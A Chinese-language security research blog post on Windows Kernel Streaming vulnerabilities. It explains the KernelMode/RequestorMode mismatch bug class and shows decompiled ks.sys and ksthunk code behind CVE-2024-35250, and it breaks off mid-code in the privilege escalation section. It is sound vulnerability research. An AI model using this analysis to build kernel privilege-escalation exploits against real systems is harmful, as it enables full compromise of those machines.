    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在过去的几十年中，Windows内核的漏洞层出不穷，热门的攻击面逐渐从Win32k慢慢转移到CLFS（通用日志文件系统）上。微软也持续且积极地修补这些漏洞，使得这些组件越来越安全。那么下一个热门的目标会是哪个组件呢？从去年开始，MSKSSRV（Microsoft内核流服务）成为黑客喜爱的目标之一。这个驱动程序小到可以在几天内完成分析。这是否意味着可能不太会有新的漏洞了呢？ </p><p>在这篇文章基于devco的研究和分享的博文修改，将讲述一个长期被忽视的攻击面，让研究团队在两个月内就找出了超过10个漏洞。此外，我们还将深入探讨一种基于代理的逻辑漏洞类型，使我们可以忽略掉大多数的检查，最终成功在Pwn2Own Vancouver 2024中，攻下Windows 11的项目。 这份研究将分成数个部分来撰写，分别讲述不同的漏洞类型及漏洞形态，亦发表于<a href="https://hitcon.org/2024/CMT/agenda/">HITCON CMT 2024</a>中。 </p><h2 id="从MSKSSRV开始"><a href="#从MSKSSRV开始" class="headerlink" title="从MSKSSRV开始"></a>从MSKSSRV开始</h2><blockquote><p> 对于一项漏洞研究来说，从历史的漏洞看起，是不可或缺的。 </p></blockquote><p>起初，为了挑战Pwn2Own Vancouver 2024中Windows 11的项目，我们开始从过去的Pwn2Own以及近期在野的漏洞中开始审视，寻找可能的攻击面。沿着历史轨迹可以得知，过去主要负责GDI相关操作的Win32K一直是个很热门的目标，从2018年以来，CLFS（通用日志文件系统）也渐渐成为了热门目标之一。这两个组件都非常复杂，并且直到现在仍然有不少新漏洞出现，但要熟悉这两个组件需要花不少时间，同时也有许多研究员在关注这两个组件，所以最终我们没有先选择分析它们。 去年<a href="https://www.synacktiv.com/en">Synacktiv</a>在Pwn2Own 2023中，使用MSKSSRV的<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360">漏洞</a>成功攻下Windows 11后，便有不少人往这个组件开始看起，短时间内就又出现了<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36802">第二个漏洞CVE-2023-36802</a>，这时<a href="https://x.com/chompie1337">chompie</a>也发表了一篇<a href="https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/">非常详细的文章</a>，讲述这个漏洞成因及其利用细节。由于这个组件非常小，只看文件大小约略只有72KB，可能认真看个几天就可以全部看完，因此我们便挑了MSKSSRV来做历史漏洞分析，看看是否有机会抓出其他漏洞。 接下来我们会提一下这两个漏洞，但不会着墨过多。 </p><h3 id="CVE-2023-29360-逻辑漏洞"><a href="#CVE-2023-29360-逻辑漏洞" class="headerlink" title="CVE-2023-29360 - 逻辑漏洞"></a>CVE-2023-29360 - 逻辑漏洞</h3><p>第一个是Synacktiv在Pwn2Own 2023中所使用的漏洞： <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/1.png"> 这是一个逻辑上的漏洞。当MSKSSRV使用<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmprobeandlockpages">MmProbeAndLockPages</a>锁定用户给的内存位置作为帧缓冲区时，并没有设置正确的访问模式，导致没有检查用户指定的位置是否属于用户空间。如果用户给的是内核空间中的位置，它就会把指定的内核位置映射到用户空间给用户用，最终导致用户可以对内核中的任意位置写入，利用上简单且非常稳定，成为了受欢迎的<a href="https://www.cisa.gov/news-events/alerts/2024/02/29/cisa-adds-one-known-exploited-vulnerability-catalog">漏洞之一</a>。 更多细节可以参考Synacktiv在HITB 2023 HKT的<a href="https://conference.hitb.org/hitbsecconf2023hkt/materials/D2T1%20-%20Windows%20Kernel%20Security%20-%20A%20Deep%20Dive%20into%20Two%20Exploits%20Demonstrated%20at%20Pwn2Own%20-%20Thomas%20Imbert.pdf">演讲</a>及<a href="https://x.com/Big5_sec">Nicolas Zilio(@Big5_sec)</a>的<a href="https://big5-sec.github.io/posts/CVE-2023-29360-analysis/">博客文章</a>。 </p><h3 id="CVE-2023-36802-类型混淆"><a href="#CVE-2023-36802-类型混淆" class="headerlink" title="CVE-2023-36802 - 类型混淆"></a>CVE-2023-36802 - 类型混淆</h3><p>这个漏洞则是在CVE-2023-29360出来后没多久被许多人发现，并且在微软发布更新时，就已经侦测到利用，是个非常容易被发现的漏洞。MSKSSRV会先将内部使用的对象（FSContextReg、FSStreamReg）存放在<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_file_object">FILE_OBJECT</a>的FsContext2中，然而后续使用时并没有对FsContext2的<strong>类型</strong>做检查，导致类型混淆，详细内容可参考<a href="https://securityintelligence.com/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/">IBM X-Force的博客</a>。 至此之后，就很少有关于MSKSSRV的相关漏洞了。 </p><h3 id="但这就是结束了吗？"><a href="#但这就是结束了吗？" class="headerlink" title="但这就是结束了吗？"></a>但这就是结束了吗？</h3><p> 然而是否这样就没洞了呢？ <strong>而我要更准确地回答，不！</strong> 实际上整个内核流就像下面这张图这样： <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/2.png"> MSKSSRV只是冰山一角而已，实际上还有不少潜在的组件，上图中所写的都是属于内核流的一部分。实际往这方向挖掘之后，最终也在这个攻击面上取得不少漏洞，就如同流水般的流出漏洞来。<img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/cover.png"> 顺便一提，我在写这篇博客时，chompie也发表了有关他在今年Pwn2Own Vancouver 2024中所使用的漏洞<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30089">CVE-2024-30089</a>。这个漏洞也在MSKSSRV中，该漏洞发生在引用计数的处理，其成因也很有趣，不过这边就不多谈，详细内容可参考她<a href="https://securityintelligence.com/x-force/little-bug-that-could/">发表的文章</a>。 </p><h2 id="内核流概述"><a href="#内核流概述" class="headerlink" title="内核流概述"></a>内核流概述</h2><p>那么，什么是内核流呢？事实上，我们正常使用电脑情况下就会用到： <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/4.png"> 在Windows系统上，当我们打开摄像头、开启音效以及麦克风等音频设备时，系统需要从这些设备读取你的声音、影像等相关资料到RAM中。为了更高效地完成这些资料的传输，微软提供了一个名为<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/kernel-streaming">内核流</a>的框架，用来处理这些资料。<strong>这个框架主要在内核模式下运行</strong>，具有低延迟、良好的扩展性和统一接口等特性，使你能更方便、更高效地处理流（Stream）资料。 内核流中，提供了三种多媒体驱动模型：端口类、AVStream和流类。这里将主要介绍端口类和AVStream，而流类因为较为罕见且过时，不会多加讨论。 </p><h3 id="端口类"><a href="#端口类" class="headerlink" title="端口类"></a><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/introduction-to-port-class">端口类</a></h3><p>大多数用于PCI和DMA型音频设备的硬件驱动程序，它处理与音频相关的数据传输，例如音量控制、麦克风输入等等，主要会使用到的组件函数库会是portcls.sys。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/5.png"> </p><h3 id="AVStream"><a href="#AVStream" class="headerlink" title="AVStream"></a><a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/avstream-overview">AVStream</a></h3><p>AVStream则是由微软提供的多媒体类驱动程序，主要支持仅限影片的流和整合音频&#x2F;影片流，目前跟影像有关的处理多数都跟这类别有关，例如你的视频摄像头、采集卡等等。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/6.png"> </p><p>实际上内核流的使用很复杂，因此这里只会简单的叙述一下，更多详细内容可以参考<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/">微软官方文档</a>。 </p><h2 id="与设备交互"><a href="#与设备交互" class="headerlink" title="与设备交互"></a>与设备交互</h2><p>在我们想要与音频设备或是视频摄像头等设备互动时该怎么做呢？其实就跟一般设备互动一样，可以透过CreateFile函数来开启一个设备。那么这类设备的名称又会是什么呢？其实这边不太会像是<code>\Devcie\NamedPipe</code>这类型的名称，而是会像下面这样的路径： <code>\\?\hdaudio#subfunc_01&amp;ven_8086&amp;dev_2812&amp;nid_0001&amp;subsys_00000000&amp;rev_1000#6&amp;2f1f346a&amp;0&amp;0002&amp;0000001d#&#123;6994ad04-93ef-11d0-a3cc-00a0c9223196&#125;\ehdmiouttopo </code> </p><h3 id="枚举设备"><a href="#枚举设备" class="headerlink" title="枚举设备"></a>枚举设备</h3><p>每台电脑都可能不一样，必须使用<a href="https://learn.microsoft.com/zh-tw/windows/win32/api/setupapi/nf-setupapi-setupdigetclassdevsw">SetupDiGetClassDevs</a>等API去列举设备，一般来说KS系列的设备都会注册在<code>KSCATEGORY*</code>底下，像是音频设备就会注册在<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/install/kscategory-audio">KSCATEGORY_AUDIO</a>中。 你也可以使用KS所提供的<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ksproxy/nf-ksproxy-ksopendefaultdevice">KsOpenDefaultDevice</a>获得该类别中第一个符合的PnP装置的句柄，实际上来说也只是SetupDiGetClassDevs和CreateFile的封装而已。 <code>hr = KsOpenDefaultDevice(KSCATEGORY_VIDEO_CAMERA,GENERIC_READ|GENERIC_WRITE, &amp;g_hDevice) </code> </p><h3 id="内核流对象"><a href="#内核流对象" class="headerlink" title="内核流对象"></a>内核流对象</h3><p>我们在开启这些设备之后，内核流会在内核中建立一些相关的实例，其中最为重要的就是<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-filters">KS过滤器</a>及<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ks-pins">KS引脚</a>。在内核流的使用过程中，这些实例会被频繁使用，它们主要用来封装设备的硬件功能，方便开发者透过统一的接口进行流的处理。 这边先以<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters">音频过滤器</a>作为例子，其他多数大同小异，我们也只会简单介绍，其他细节请自行参考微软官方文档。 </p><h4 id="KS过滤器"><a href="#KS过滤器" class="headerlink" title="KS过滤器"></a>KS过滤器</h4><p>每个KS过滤器通常代表一个设备或设备的特定功能，在我们打开一个音频设备后，大部分情况下会对应到一个内核过滤器，当我们从音频设备读取资料时，这些资料就会先通过这个KS过滤器进行处理。 概念上如下所示，中间的大框表示一个代表音频设备的KS过滤器。而我们想要从音频设备中读取资料时，会从左边读入过滤器，经过几个节点进行处理后，从右边输出。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/7.png"> (From: <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters">https://learn.microsoft.com/en-us/windows-hardware/drivers/audio/audio-filters</a>) </p><h4 id="KS引脚"><a href="#KS引脚" class="headerlink" title="KS引脚"></a>KS引脚</h4><p>上图中，读取及输出资料的点称为引脚，内核也有相对应的KS引脚对象，用于描述这些引脚的行为，例如引脚是输入端还是输出端、支持的格式有哪些等。我们使用时必须在过滤器上，<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/nf-ks-kscreatepin">开启一个引脚</a>来建立实例，才能从设备读取或输出资料。 </p><h3 id="KS属性"><a href="#KS属性" class="headerlink" title="KS属性"></a>KS属性</h3><p>这些KS对象都有自己的属性，每个属性都有相对应的功能，前面所提到的引脚中的资料格式、音量大小及设备的状态等等，这些都是一个属性，通常会对应到一组GUID，我们可以透过<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_property">IOCTL_KS_PROPERTY</a>来读取或设定这些属性。 这大大简化了多媒体驱动程序的开发，并确保了不同设备之间的一致性和可扩展性。 </p><h3 id="从网络摄像头读取流"><a href="#从网络摄像头读取流" class="headerlink" title="从网络摄像头读取流"></a>从网络摄像头读取流</h3><p>这边就用个简单的范例来介绍一下应用程序如何从视频摄像头读取资料 其最简单的流程大概如这张图所示： <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/8.png"> </p><ol><li><p>开启设备后获得设备句柄 </p></li><li><p>使用这个句柄在这个过滤器上建立引脚的实例并获得引脚句柄 </p></li><li><p>使用IOCTL_KS_PROPERTY设置引脚的状态到RUN </p></li><li><p>最后就可以使用<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ks/ni-ks-ioctl_ks_read_stream">IOCTL_KS_READ_STREAM</a>从这个引脚中读资料进来</p></li></ol><h2 id="内核流架构"><a href="#内核流架构" class="headerlink" title="内核流架构"></a>内核流架构</h2><p>对漏洞研究而言，我们必须先了解其架构，思考有哪些可能的攻击面 在初步了解内核流有哪些功能和操作后，为了找寻漏洞必须先了解一下架构，了解Windows是怎么实现这些功能、分别有哪些组件等等，才知道应该要分析哪些系统文件，从哪下手会比较好。 经过我们分析后，整个架构约略会像这张图所示： <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/9.png"> 在内核流组件中，最为核心的就是ksthunk.sys及ks.sys，几乎所有功能都会与它们有关。 r</p><h3 id="ksthunk（内核流WOW转换服务驱动程序）"><a href="#ksthunk（内核流WOW转换服务驱动程序）" class="headerlink" title="ksthunk（内核流WOW转换服务驱动程序）"></a>ksthunk（内核流WOW转换服务驱动程序）</h3><p> 应用程序调用DeviceIoControl后，在内核流中的<strong>入口点</strong>，但它功能很简单，负责将WoW64进程中32位的请求转换成64位的请求，使得下层的驱动程序就可以不必为32位的结构另外处理。 </p><h3 id="ks（内核连接和流架构库）"><a href="#ks（内核连接和流架构库）" class="headerlink" title="ks（内核连接和流架构库）"></a>ks（内核连接和流架构库）</h3><p>内核流的<strong>核心组件</strong>之一，它是内核流的函数库，负责及转发IOCTL_KS_PROPERTY等请求到对应设备的驱动程序中，同时也会负责处理AVStream的相关功能。 </p><h3 id="IOCTL-KS-的工作流程"><a href="#IOCTL-KS-的工作流程" class="headerlink" title="IOCTL_KS_*的工作流程"></a>IOCTL_KS_*的工作流程</h3><p>而在呼叫DeviceIoControl时，就会像下所示，将使用者的请求依序给相对应的驱动程序来处理 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/10.png"> 而到第6步时ks.sys就会根据你请求的<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure">属性</a>来决定要交给哪个驱动程序及处理程序来处理你的请求。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/11.png"> 最终再转发给相对应的驱动程序，如上中最后转发给portcls中的处理程序来操作音频设备。 到这边应该对内核流的架构及流程有初步概念了，接下来就是找洞的时刻。依照现有的元素来看，哪些是值得一看的攻击面呢？ </p><h3 id="从攻击者的角度"><a href="#从攻击者的角度" class="headerlink" title="从攻击者的角度"></a>从攻击者的角度</h3><blockquote><p>在挖掘漏洞前，如果能仔细思考怎样的情况下容易有洞，可以达到事半功倍的效果 </p></blockquote><p>从一个漏洞研究员的角度来说，大概会有下列这几个点 </p><ol><li>每个设备中的属性处理程序每个设备中的KS对象都有各自的属性，而且每个属性都有各自的实现，有些属性处理起来容易出问题。 </li><li>ks及ksthunk ks及ksthunk已经有很长一段时间没有漏洞，但却是个最容易接触到的入口点，也许是一个好目标，上一次出现的漏洞是在2020年<a href="https://x.com/nghiadt1098">@nghiadt1098</a>所找到的两个漏洞<a href="https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-16889">CVE-2020-16889</a>及<a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-17045">CVE-2020-17045</a>。 </li><li>每个驱动程序都各自处理一部分的内容在内核流的部分功能中，有些驱动程序会各自先处理部分的内容，</li></ol><p>可能会造成一些不一致性的问题。 我们针对上面几个角度去对整个内核流做代码审查后，很快的就发现了几个比较容易发现的漏洞： </p><ul><li>portcls.sys    <ul><li>CVE-2024-38055（设置引脚数据格式时的越界读取）    </li><li>CVE-2024-38056</li></ul></li><li>ksthunk    <ul><li>CVE-2024-38054（越界写入）    </li><li>CVE-2024-38057</li></ul></li></ul><p>不过我们这一篇不会一一讲解这些漏洞，这几个多数都是没有检查长度或是索引之类的越界存取等等明显的漏洞，也许会在后续的部分慢慢来讲解，<a href="https://x.com/Fr0st1706">@Fr0st1706</a>也在前阵子写出了 CVE-2024-38054 的<a href="https://github.com/Black-Frost/windows-learning/tree/main/CVE-2024-38054">利用</a>，这边就暂时留给读者研究了。 这篇要提的是，我们在审查过程中发现了一些有趣的事情。 你觉得下面这段代码是否安全呢？ </p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__int64</span> <span class="hljs-variable">__fastcall</span> CKSThunkDevice::CheckIrpForStackAdjustmentNative(<span class="hljs-variable">__int64</span> a1, struct <span class="hljs-variable">_IRP</span> *irp, <span class="hljs-variable">__int64</span> a3, int *a4)<br>&#123;<br><br>    <span class="hljs-keyword">if</span> ( irp-&gt;RequestorMode )<br>    &#123;<br>        v14 = <span class="hljs-number">0</span>xC0000010;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        UserBuffer = (unsigned int *)irp-&gt;UserBuffer;<br>       ...<br>        v14 = (*(<span class="hljs-variable">__int64</span> (<span class="hljs-variable">__fastcall</span> **)(<span class="hljs-variable">_QWORD</span>, <span class="hljs-variable">_QWORD</span>, <span class="hljs-variable">__int64</span> *))    (Type3InputBuffer + <span class="hljs-number">0</span>x38))(<span class="hljs-comment">// call Type3InputBuffer+0x38</span><br>                *UserBuffer,<br>                <span class="hljs-number">0</span>LL,<br>               v19);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>看到这段代码让我想起了<a href="https://decoded.avast.io/janvojtesek/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day/">CVE-2024-21338</a>，该漏洞原先并没有任何检查，而在修补后则是新增了<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-exgetpreviousmode">ExGetPreviousMode</a>，但这边检查则是使用了<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp">IRP</a>中的 RequestorMode 来做检查，不过一般情况下从使用者呼叫的 IOCTL 的 RequestorMode 都会是 UserMode(1)是不会有问题的。 此时我又想起了<a href="https://x.com/tiraniddo">James Forshaw</a>的<a href="https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html">Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager</a>这篇文章。 </p><h2 id="被忽视的漏洞类别"><a href="#被忽视的漏洞类别" class="headerlink" title="被忽视的漏洞类别"></a>被忽视的漏洞类别</h2><p>这部分我们必须先提一下几个名词跟概念，不过如果你对 PreviousMode 及 RequestorMode 很熟悉，可以跳至<a href="#A-logical-bug-class">A logical bug class</a>。 </p><h3 id="PreviousMode"><a href="#PreviousMode" class="headerlink" title="PreviousMode"></a>PreviousMode</h3><p>第一个是 PreviousMode，在应用程序中如果使用者透过 Nt<em>等系统服务调用对设备或文件进行操作时，进入内核后就会在<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/kernel/eprocess#ethread">_ETHREAD</a>中的 PreviousMode 标注 UserMode(1)表示这个系统服务调用是来自用户模式的应用程序。如果你是从内核模式中，例如设备驱动程序呼叫 Zw</em>系统服务调用的 API 就会标记成 KernelMode(0)。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/12.png"> </p><h3 id="RequestorMode"><a href="#RequestorMode" class="headerlink" title="RequestorMode"></a>RequestorMode</h3><p>另外一个类似的则是 IRP 中的 RequestorMode，这里就是记录你原始的请求是来自用户模式还是内核模式，在内核驱动程序中的代码是非常常用到的字段，通常会来自 PreviousMode。 </p><p>经常被用来决定是否要对来自使用者的请求做额外检查，像是内存访问检查或是安全访问检查，例如下面这个例子中，如果请求来自用户模式就会检查使用者提供的位置，如果是从内核来的，就不做额外检查以增加效率。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/13.png"> 但实际上这也出现了一些问题… </p><h3 id="A-logical-bug-class"><a href="#A-logical-bug-class" class="headerlink" title="A logical bug class"></a>A logical bug class</h3><p>在<a href="https://x.com/tiraniddo">James Forshaw</a>的<a href="https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html">Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager</a>中，就提到了一种漏洞类别。 这里可以先想想看，使用者呼叫 NtDeviceIoControlFile之类的系统服务调用之后，如果处理的驱动程序又去用使用者可控的资料来作为 ZwOpenFile 的参数，会发生什么事。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/14.png"> 在驱动程序呼叫 ZwOpenFile 之后，PreviousMode 会转换成为<code>KernelMode</code>，并且在 NtOpenFile 处理时，就会因为 PreviousMode 是<code>KernelMode</code>的关系少掉大部分的检查，而后续的<code>Irp-&gt;RequestorMode</code>也会因此变成<code>KernelMode</code>，从而绕过安全访问检查及内存访问检查。不过这边很看后续处理的驱动程序怎么去实现这些检查，如果只依赖 RequestorMode 来决定要不要检查，就可能会有问题。这边省略了一些细节，实际上的状况会稍微再复杂一点点，也会跟 CreateFile 的标志有关，细节可参考下列几篇文章： </p><ul><li><a href="https://googleprojectzero.blogspot.com/2019/03/windows-kernel-logic-bug-class-access.html">Windows Kernel Logic Bug Class: Access Mode Mismatch in IO Manager</a> </li><li><a href="https://googleprojectzero.blogspot.com/2021/01/hunting-for-bugs-in-windows-mini-filter.html">Hunting for Bugs in Windows Mini-Filter Drivers</a> </li><li><a href="https://msrc.microsoft.com/blog/2019/03/local-privilege-escalation-via-the-windows-i-o-manager-a-variant-finding-collaboration/">Local privilege escalation via the Windows I&#x2F;O Manager: a variant finding collaboration</a></li></ul><p>这边有这样的概念就好，原先这些研究主要是在 Zw*系列的系统服务调用上面，大家可以思考一下，有没有其他类似的情况，也可能造成这种逻辑漏洞呢？ </p><h4 id="新的漏洞模式"><a href="#新的漏洞模式" class="headerlink" title="新的漏洞模式"></a>新的漏洞模式</h4><p>事实上来说是有的，使用<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest">IoBuildDeviceIoControlRequest</a>这个方法去创建一个 DeviceIoControl 的 IRP 时，万一没注意到也很容易有这样的问题。这个 API 主要是内核驱动程序用来呼叫 IOCTL 的其中一种方法，它会帮你建好 IRP，而后续在去呼叫<a href="https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iofcalldriver">IofCallDriver</a>，就可以在内核驱动程序中呼叫 IOCTL。在<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iobuilddeviceiocontrolrequest">Microsoft Learn</a>中，有一段话特别值得注意： <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/15.png"> 也就是预设情况下，如果你没有特别去设置 RequestorMode 就会直接以 KernelMode 形式去呼叫 IOCTL。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/16.png"> </p><p>按照这个思路，我们重新回头审视一下我们的目标内核流，我们发现了一个吸引我们的地方。 </p><p><img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/17.png"> </p><p>在内核流中使用这个 IoBuildDeviceIoControlRequest 地方是在<code>ks!KsSynchronousIoControlDevice</code>，而主要内容明显就是在用刚刚提到的方法，在内核中呼叫 DeviceIoControl，不过这边看似有好好的设置<code>Irp-&gt;RequestorMode</code>，且会根据 KsSynchronousIoControlDevice 参数不同而去设置不同的数值，对于开发者来说会是一个方便的函数库。 然而… ks!CKsPin::GetState<img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/18.png"> ks!SerializePropertySet<img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/19.png"> ks!UnserializePropertySet<img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/20.png"> </p><p>我们发现到在内核流中，全部有使用到<code>KsSynchronousIoControlDevice</code>的地方都是固定的使用 KernelMode(0)，到这边就可以仔细的检查看看，有用到的地方是否有安全上的问题了。因此我们将内核流中的漏洞模式转换成下列几点：</p><ol><li>有使用 KsSynchronousIoControlDevice。 </li><li>有可控的：</li></ol><ul><li>InputBuffer。   </li><li>OutputBuffer。</li></ul><ol start="3"><li>第二次处理 IOCTL 的地方有依赖 RequestorMode 做安全检查，并且有可以作为提权利用的地方。<img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/21.png"></li></ol><p>按照这个模式我们很快地就找到了第一个漏洞。 </p><h2 id="漏洞及利用"><a href="#漏洞及利用" class="headerlink" title="漏洞及利用"></a>漏洞及利用</h2><h3 id="CVE-2024-35250"><a href="#CVE-2024-35250" class="headerlink" title="CVE-2024-35250"></a>CVE-2024-35250</h3><p>这个漏洞也是我们今年在<a href="https://x.com/thezdi/status/1770517322203070674">Pwn2Own Vancouver 2024 中所使用的漏洞</a>。在内核流的 IOCTL_KS_PROPERTY 功能中，为了让效率增加，提供了<code>KSPROPERTY_TYPE_SERIALIZESET</code>和<code>KSPROPERTY_TYPE_UNSERIALIZESET</code>功能允许使用者透过<strong>单一呼叫</strong>与多个属性进行操作。当我们用这功能时，这些请求将被 KsPropertyHandler 函数分解成多个呼叫，详情可参考<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/stream/ksproperty-structure#remarks">这篇</a>。 该功能实现在 ks.sys 中。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/22.png"> 上图中可以看到，在 ks 处理属性时，如果有给上述的标志就会由 UnserializePropertySet 来处理你的请求。 我们这边就先来看一下 UnserializePropertySet。 </p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xl">unsigned __int64 __fastcall UnserializePropertySet(<br>    PIRP irp,<br>    KSIDENTIFIER* UserProvideProperty,<br>    KSPROPERTY_SET* propertyset_)<br>&#123;<br>   ...<br>    New_KsProperty_req = ExAllocatePoolWithTag(NonPagedPoolNx, InSize, <span class="hljs-number">0</span>x7070534Bu);<br>   ...<br>    <span class="hljs-function"><span class="hljs-title">memmove</span>(New_KsProperty_req, CurrentStackLocation-&gt;</span>Parameters.DeviceIoControl.Type3InputBuffer, InSize); <span class="hljs-comment">//------[1] </span><br>   ...<br>    status = KsSynchronousIoControlDevice(<br>            C<span class="hljs-function"><span class="hljs-title">urrentStackLocation</span>-&gt;</span>FileObject,<br>            <span class="hljs-number">0</span>,<br>            C<span class="hljs-function"><span class="hljs-title">urrentStackLocation</span>-&gt;</span>Parameters.DeviceIoControl.IoControlCode,<br>            New_KsProperty_req,<br>            InSize,<br>            OutBuffer,<br>            OutSize,<br>            &amp;BytesReturned); <span class="hljs-comment">//-----------[2]</span><br>   ...<br>&#125; <br></code></pre></td></tr></table></figure><p>可看到在处理过程中会先将原始的请求，复制到新分配出来的缓冲区中[1]，而后续就会使用这个缓冲区来使用 KsSynchronousIoControlDevice 呼叫新的 IOCTL[2]。其中<code>New_KsProperty_req</code>及<code>OutBuffer</code>都是使用者所传入的内容。 而呼叫 UnserializePropertySet 时的流程，大概如下所示： <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/23.png"> 这边呼叫 IOCTL 时可以看到图中第 2 步 I&#x2F;O 管理器会将<code>Irp-&gt;RequestorMode</code>设成 UserMode(1)，直到第 6 步时，ks 会去判断使用者请求的属性是否存在于该 KS 对象中，如果该 KS 对象的属性<strong>存在</strong>，并且有设置<code>KSPROPERTY_TYPE_UNSERIALIZESET</code>就会用<code>UnserializePropertySet</code>来处理指定的属性。 <img src="https://raw.githubusercontent.com/Hipepper/allPictures/main/202410/1018/24.png"> 而接下来第 7 步就会呼叫 KsSynchronousIoControlDevice 重新做一次 IOCTL，而此时新的<code>Irp-&gt;RequestorMode</code>就变成了 KernelMode(0)了，而后续的处理就如一般的 IOCTL_KS_PROPERTY 相同，就不另外详述了，总之我们到这里已经有个可以任意做 IOCTL_KS_PROPERTY 的基本条件了，接下来我们必须寻找看看是否有可以提权的地方。 </p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>最先看到的想必就是入口点 ksthunk，我们这边可以直接来看<code>ksthunk!CKSThunkDevice::DispatchIoctl</code>。 </p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs zephir"> __int64 __fastcall CKSThunkDevice::DispatchIoctl(CKernelFilterDevice *a1, IRP *irp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a3, NTSTATUS *a4)<br>&#123;<br> ...<br>  <span class="hljs-keyword">if</span> ( IoIs32bitProcess(irp) &amp;&amp; irp-&gt;RequestorMode ) 